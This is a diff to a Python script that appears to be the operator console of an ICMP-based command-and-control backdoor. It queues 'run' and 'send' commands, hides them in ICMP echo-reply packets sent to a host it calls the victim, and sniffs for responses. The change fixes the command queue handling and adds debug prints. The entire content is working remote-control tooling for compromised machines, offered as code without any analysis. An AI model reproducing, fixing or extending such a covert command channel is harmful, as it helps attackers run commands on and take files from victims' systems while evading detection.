@@ -8,24 +8,32 @@ def commands_input():
     global commands_que
     while True:
         if not commands_que:
-            commands_que = input("\nEnter type and command (ex: run ls):\n").split ()
+            words = input("\nEnter type and command (ex: run ls):\n").split ()
+            key = words[0]
+            value = ' '.join(words[1:])
+            commands_que = {key: value}
             print(commands_que)
 
 def send_command(ip_adr):
     global commands_que
     if not commands_que:
         return
-    id_type = commands_que.keys
-    coomand_name = commands_que.values
+    print("commands_que:")
+    print(type(commands_que))
+    id_type = next(iter(commands_que))
+    print("id type is: " + id_type)
+    command_name = commands_que[id_type]
+    print("command is: " + command_name)
     if id_type == "run":
         id_type = RUN
     elif id_type == "send":
         id_type = FILE
-    pkt_send(dest=ip_adr,data=commands_que,icmp_type="echo-request",id_packet=id_type)
+    pkt_send(dest=ip_adr,data=command_name,icmp_type="echo-reply",id_packet=id_type)
     commands_que = ""
         
     
 def parse_packet(packet):
+    global opened_fd
     if Raw in packet:
         victim_ip = packet[IP].src
         type_packet = check_type(packet)
@@ -61,7 +69,6 @@ enter_command_thread.start()
 
 print("start listening")
 server_listen()    # Start sniffing packets
-
 
 
 
